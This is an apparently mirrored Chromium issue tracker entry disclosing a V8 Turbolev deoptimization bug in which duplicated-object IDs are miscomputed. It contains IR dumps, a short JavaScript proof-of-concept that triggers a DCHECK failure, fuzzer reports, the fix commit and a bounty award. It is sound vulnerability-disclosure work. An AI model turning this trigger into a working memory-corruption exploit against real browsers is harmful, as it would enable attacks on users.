# Deoptimize: inconsistency in materialization can insert unexpected value to the interpreter stack frame

| Field | Value |
|-------|-------|
| **Issue ID** | [423050527](https://issues.chromium.org/issues/423050527) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Turbofan |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ak...@gmail.com |
| **Assignee** | dm...@chromium.org |
| **Created** | 2025-06-07 |
| **Bounty** | $10,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

VULNERABILITY DETAILS

Deoptimize: inconsistency in materialization can insert unexpected value to the interpreter stack frame

When deoptimize a function, the engine will need to translate the frame of optimized code back to interpreter frame.

```
  reading input frame foo => bytecode_offset=20, args=1, height=4, retval=0(#0); inputs:
      0: 0x286a002259f5 ;  [fp -  16]  0x286a002259f5 <JSFunction foo (sfi = 0x286a002258e5)>
      1: 0x286a0020c69d ;  [fp +  16]  0x286a0020c69d <JSGlobalProxy>
      2: 0x286a0020c6fd ; (literal  2) 0x286a0020c6fd <NativeContext[301]>
      3: captured object #0 (length = 5)
           0x286a00225b9d ; (literal  3) 0x286a00225b9d <Map[20](HOLEY_ELEMENTS)>
           0x286a000007bd ; (literal  4) 0x286a000007bd <FixedArray[0]>
           0x286a000007bd ; (literal  4) 0x286a000007bd <FixedArray[0]>
           captured object #1 (length = 2)
             0x286a00000515 ; (literal  5) 0x286a00000515 <Map[12](HEAP_NUMBER_TYPE)>
             0x286a0008a681 ; (literal  6) 0x286a0008a681 <HeapNumber 11.1>
           captured object #2 (length = 4)
             0x286a00214f01 ; (literal  7) 0x286a00214f01 <Map[16](PACKED_DOUBLE_ELEMENTS)>
             0x286a000007bd ; (literal  4) 0x286a000007bd <FixedArray[0]>
             captured object #3 (length = 5)
               0x286a0000091d ; (literal  8) 0x286a0000091d <Map(FIXED_DOUBLE_ARRAY_TYPE)>
               0x286a00000006 ; (literal  9) 3
               0x286a0008a68d ; (literal 10) 0x286a0008a68d <HeapNumber 1.1>
               0x286a0008a699 ; (literal 11) 0x286a0008a699 <HeapNumber 2.2>
               0x286a0008a6a5 ; (literal 12) 0x286a0008a6a5 <HeapNumber 3.3>
             0x286a00000006 ; (literal  9) 3
      4: captured object #4 (length = 4)
           0x286a002145e5 ; (literal 13) 0x286a002145e5 <Map[16](PACKED_SMI_ELEMENTS)>
           0x286a000007bd ; (literal  4) 0x286a000007bd <FixedArray[0]>
           0x286a000007bd ; (literal  4) 0x286a000007bd <FixedArray[0]>
           0x286a00000000 ; (literal 14) 0
      5: (optimized out)
      6: (optimized out)
      7: (optimized out)
  reading input frame inline => bytecode_offset=5, args=3, height=2, retval=0(#0); inputs:
      0: 0x286a002259c1 ; (literal 15) 0x286a002259c1 <JSFunction inline (sfi = 0x286a002258b5)>
      1: 0x286a0020c69d ; (literal 16) 0x286a0020c69d <JSGlobalProxy>
      2: duplicated object #0
      3: duplicated object #3
      4: 0x286a0020c6fd ; (literal  2) 0x286a0020c6fd <NativeContext[301]>
      5: (optimized out)
      6: 0x286a00000002 ; (literal 17) 1
      7: 0x286a00225c1d ; (literal 18) 0x286a00225c1d <HeapNumber 13.37>

```

To perform escape analysis, deoptimization data has to be recorded, the inline allocation sites can be mapped to a captured `VirtualObject`. This is done in the `AddDeoptInput` -> `AddVirtualObjectInput` function, which is responsible for adding the virtual object to

```
void AddDeoptInput(FrameStateData::Builder& builder,
                     const maglev::VirtualObjectList& virtual_objects,
                     const maglev::ValueNode* node) {
    if (const maglev::InlinedAllocation* alloc =
            node->TryCast<maglev::InlinedAllocation>()) {
      DCHECK(alloc->HasBeenAnalysed());
      if (alloc->HasBeenElided()) {
        AddVirtualObjectInput(builder, virtual_objects,
                              virtual_objects.FindAllocatedWith(alloc));
        return;
      }
    }
    // ...
}

```

When there is a duplicated input, the `GetDuplicatedId()` can directly return the id of a given virtual object. And it will insert the object to the `object_ids_` vector if it is not found.

```
    DuplicatedId GetDuplicatedId(const maglev::VirtualObject* object) {
      // TODO(dmercadier): do better than a linear search here.
      for (uint32_t idx = 0; idx < object_ids_.size(); idx++) {
        if (object_ids_[idx] == object) {
          return {idx, true};
        }
      }
      object_ids_.push_back(object);
      return {next_id_++, false};
    }

```

For the below IR

```
* VOs (Merge Frame State):
  0x5555558e95d8  n7: RootConstant(one_pointer_filler_map) → (x), 0 uses 🪦
  0x5555558e9630  n8: RootConstant(empty_fixed_array) → (x), 0 uses 🪦
  0x5555558e9720  n9: SmiConstant(3) → (x), 0 uses 🪦
  0x5555558e9930  n10: AllocationBlock(Young) → (x), 0 uses 🪦
  0x5555558e99b8  n11: InlinedAllocation(number 0x26f600000515 <Map[12](HEAP_NUMBER_TYPE)>) [n10:(x)] → (x), 0 uses (0 non escaping uses)
  0x5555558e9a50  n12: StoreMap(0x26f600000515 <Map[12](HEAP_NUMBER_TYPE)>, InlinedAllocation) [n11:(x)]
  0x5555558e9ae0  n13: Float64Constant(1.1) → (x), 0 uses 🪦
  0x5555558e9b70  n14: StoreFloat64(0x4) [n11:(x), n13:(x)]
  0x5555558e9ba0  n15: AllocationBlock(Young) → (x), 0 uses 🪦
  0x5555558e9c28  n16: InlinedAllocation(double[] 0x26f60000091d <Map(FIXED_DOUBLE_ARRAY_TYPE)>) [n15:(x)] → (x), 0 uses (0 non escaping uses)
  0x5555558e9cc0  n17: StoreMap(0x26f60000091d <Map(FIXED_DOUBLE_ARRAY_TYPE)>, InlinedAllocation) [n16:(x)]
  0x5555558e9d88  n18: StoreTaggedFieldNoWriteBarrier(0x4) [n16:(x), n9:(x)]
  0x5555558e9de0  n19: StoreFloat64(0x8) [n16:(x), n13:(x)]
  0x5555558e9e08  n20: Float64Constant(2.2) → (x), 0 uses 🪦
  0x5555558e9e98  n21: StoreFloat64(0x10) [n16:(x), n20:(x)]
  0x5555558e9ec0  n22: Float64Constant(3.3) → (x), 0 uses 🪦
  0x5555558e9f50  n23: StoreFloat64(0x18) [n16:(x), n22:(x)]
  0x5555558e9f80  n24: AllocationBlock(Young) → (x), 0 uses 🪦
  0x5555558ea008  n25: InlinedAllocation(object 0x26f600214f01 <Map[16](PACKED_DOUBLE_ELEMENTS)>) [n24:(x)] → (x), 0 uses (0 non escaping uses)
  0x5555558ea0a0  n26: StoreMap(0x26f600214f01 <Map[16](PACKED_DOUBLE_ELEMENTS)>, InlinedAllocation) [n25:(x)]
  0x5555558ea168  n27: StoreTaggedFieldNoWriteBarrier(0x4) [n25:(x), n8:(x)]
  0x5555558ea1c8  n28: StoreTaggedFieldWithWriteBarrier(0x8) [n25:(x), n16:(x)]
  0x5555558ea228  n29: StoreTaggedFieldNoWriteBarrier(0xc) [n25:(x), n9:(x)]
  0x5555558ea258  n30: AllocationBlock(Young) → (x), 0 uses 🪦
  0x5555558ea2e0  n31: InlinedAllocation(object 0x26f600225961 <Map[20](HOLEY_ELEMENTS)>) [n30:(x)] → (x), 0 uses (0 non escaping uses)
  0x5555558ea378  n32: StoreMap(0x26f600225961 <Map[20](HOLEY_ELEMENTS)>, InlinedAllocation) [n31:(x)]
  0x5555558ea440  n33: StoreTaggedFieldNoWriteBarrier(0x4) [n31:(x), n8:(x)]
  0x5555558ea4a0  n34: StoreTaggedFieldNoWriteBarrier(0x8) [n31:(x), n8:(x)]
  0x5555558ea500  n35: StoreTaggedFieldWithWriteBarrier(0xc) [n31:(x), n11:(x)]
  0x5555558ea560  n36: StoreTaggedFieldWithWriteBarrier(0x10) [n31:(x), n25:(x)]
   4 : d0                Star0
   5 : 23 01 01          LdaGlobal [1], [1]
  0x5555558ea588  n37: Constant(0x26f600214535 <JSFunction Array (sfi = 0x26f60026d8f1)>) → (x), 0 uses 🪦
   8 : ce                Star2
   9 : 0c                LdaZero
  0x5555558ea5e8  n38: SmiConstant(0) → (x), 0 uses 🪦
  10 : cd                Star3
  11 : 6a f7 f6 03       CallUndefinedReceiver1 r2, r3, [3]
  ! Trying to reduce builtin ArrayConstructor
  0x5555558ea760  n39: AllocationBlock(Young) → (x), 0 uses 🪦
  0x5555558ea7e8  n40: InlinedAllocation(object 0x26f6002145e5 <Map[16](PACKED_SMI_ELEMENTS)>) [n39:(x)] → (x), 0 uses (0 non escaping uses)
  0x5555558ea880  n41: StoreMap(0x26f6002145e5 <Map[16](PACKED_SMI_ELEMENTS)>, InlinedAllocation) [n40:(x)]
  0x5555558ea948  n42: StoreTaggedFieldNoWriteBarrier(0x4) [n40:(x), n8:(x)]
  0x5555558ea9a8  n43: StoreTaggedFieldNoWriteBarrier(0x8) [n40:(x), n8:(x)]
  0x5555558eaa08  n44: StoreTaggedFieldNoWriteBarrier(0xc) [n40:(x), n38:(x)]
  15 : cf                Star1
  16 : 23 02 05          LdaGlobal [2], [5]
  0x5555558eaa30  n45: Constant(0x26f600225761 <JSFunction inline (sfi = 0x26f600225655)>) → (x), 0 uses 🪦
  19 : ce                Star2
  20 : 6b f7 f9 f8 07    CallUndefinedReceiver2 r2, r0, r1, [7]
  0x5555558eaae0  n46: Constant(0x26f60020c69d <JSGlobalProxy>) → (x), 0 uses 🪦

```

the `object_ids_` vector will be:

```
VirtualObject(0x26f600225961 <Map[20](HOLEY_ELEMENTS)>) → (x), 0 uses 🪦
VirtualObject(0x26f600214f01 <Map[16](PACKED_DOUBLE_ELEMENTS)>) → (x), 0 uses 🪦
VirtualObject(0x26f60000091d <Map(FIXED_DOUBLE_ARRAY_TYPE)>) → (x), 0 uses 🪦
VirtualObject(0x26f6002145e5 <Map[16](PACKED_SMI_ELEMENTS)>) → (x), 0 uses 🪦

```

When adding the deopt operand `0x26f6002145e5`, the system emits a `DUPLICATE_OBJECT 3`. However, referring back to the stack frame shown above, the third captured object is actually of type `FIXED_DOUBLE_ARRAY_TYPE`. This mismatch can cause an unintended object to be materialized in the interpreter’s stack frame. The accompanying proof-of-concept demonstrates the issue by triggering a DCHECK failure.

```
function inline(arg0, arg1) {
    arg1[1] = 13.37;
}
function foo() {
    const obj = { 
        a: 1.1,             // allocate HeapNumber
        b: [1.1, 2.2, 3.3], // allocate JSArray, allocate backing store
    };
    const alloc = Array(0);
    inline(obj, alloc);
    inline(obj, alloc);       
}
%PrepareFunctionForOptimization(foo);
foo();
foo();
%OptimizeFunctionOnNextCall(foo);
foo();

```

The file is also attached as `trigger_dcheck.js`.

VERSION

Tested on

V8 commit: `cf3cea90bfc5aa2ae92f7426ea537ed7c50b9881` (Fri May 16 14:47:30 2025 +0200)
and V8 commit: `14d0d6cf849a1cc1214c69623d67a75e9e29a00d` (Wed Jun 4 13:38:27 2025 -0700)

REPRODUCTION CASE

trigger\_dcheck.js is attached. Please run it with the following command:

```
./d8 --allow-natives-syntax \
     --jit-fuzzing \
     --turbolev ~/trigger_dcheck.js

```

It's compiled with the following `args.gn`:

```
is_debug = true
target_cpu = "x64"
v8_enable_backtrace = true
v8_enable_slow_dchecks = true
symbol_level=2
enable_nacl = false
dcheck_always_on = false
v8_enable_sandbox = false
v8_optimized_debug = false

```

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

Type of crash: DCHECK failure

CREDIT INFORMATION
Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?

Reporter credit: xia0o0o0o (@Nyaaaaa\_ovo) at University of California, San Diego

## Attachments

- trigger_dcheck.js (text/javascript, 390 B)

## Timeline

### cl...@appspot.gserviceaccount.com (2025-06-09)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4620732642295808.

### ak...@gmail.com (2025-06-09)

It seems the testcase used by ClusterFuzz is different from the one provided in the report?

### cl...@appspot.gserviceaccount.com (2025-06-10)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6268024399003648.

### mp...@google.com (2025-06-10)

Err, whoops. New clusterfuzz link: <https://clusterfuzz.com/testcase-detail/6268024399003648>

### mp...@google.com (2025-06-10)

Will assign to current v8 sheriff, with provisional severity, while Clusterfuzz works.

### 24...@project.gserviceaccount.com (2025-06-10)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2025-06-10)

Detailed Report: https://clusterfuzz.com/testcase?key=6268024399003648

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  Holder<To> v8::internal::Cast(Holder<From>, const v8::SourceLocation &) [To = v8
  T1<T> v8::internal::Cast<v8::internal::Union<v8::internal::Smi, v8::internal::He
  v8::internal::__RT_impl_Runtime_KeyedStoreIC_Miss
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=98073:98074

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6268024399003648

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### cl...@chromium.org (2025-06-10)

Darius, would you be a good owner for this?

### cl...@chromium.org (2025-06-10)

I'll re-upload with `--turboshaft-from-maglev` to try to bisect further.

### cl...@appspot.gserviceaccount.com (2025-06-10)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5076294052020224.

### 24...@project.gserviceaccount.com (2025-06-10)

Detailed Report: https://clusterfuzz.com/testcase?key=5076294052020224

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  Handle<To> v8::internal::Cast(Handle<From>, const v8::SourceLocation &) [To = v8
  v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNu
  v8::internal::__RT_impl_Runtime_KeyedStoreIC_Miss
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=95420:95421

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5076294052020224

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### cl...@chromium.org (2025-06-10)

FYI, the new bisection is `4157257 [maglev] Don't escape arguments to inline calls by Victor Gomes · 10 months ago`.

### dm...@chromium.org (2025-06-10)

Thanks for the report and the analysis :)
Fix incoming...

### dm...@chromium.org (2025-06-10)

--turbolev is disabled by default ==> impact=none

### ch...@google.com (2025-06-10)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-06-10)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### dx...@google.com (2025-06-10)

Project: v8/v8  

Branch: main  

Author: Darius Mercadier [dmercadier@chromium.org](mailto:dmercadier@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6632988>

[turbolev] Fix computation of dematerialized objects IDs

---


Expand for full commit details
```
     
    Fixed: 423050527 
    Change-Id: I1a2adde8df310a983c3a21a08efc134bfb008441 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6632988 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Reviewed-by: Victor Gomes <victorgomes@chromium.org> 
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#100743}

```

---

Files:

- M `src/compiler/turboshaft/turbolev-graph-builder.cc`
- A `test/mjsunit/turbolev/regress-423050527.js`

---

Hash: 397e21c0b169b6d4f32d7c6048e76bb1385052f3  

Date:  Tue Jun 10 12:14:03 2025


---

### ak...@gmail.com (2025-06-10)

Thank you! Just confirmed it's fixed on new commit.

### sp...@google.com (2025-06-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $10000.00 for this report.

Rationale for this decision:
high quality report of memory corruption in a sandboxed process / renderer 


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-06-18)

Thank you for your efforts and reporting this issue to us -- nice work!

### ch...@google.com (2025-09-17)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> high quality report of memory corruption in a sandboxed process / renderer

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/423050527)*
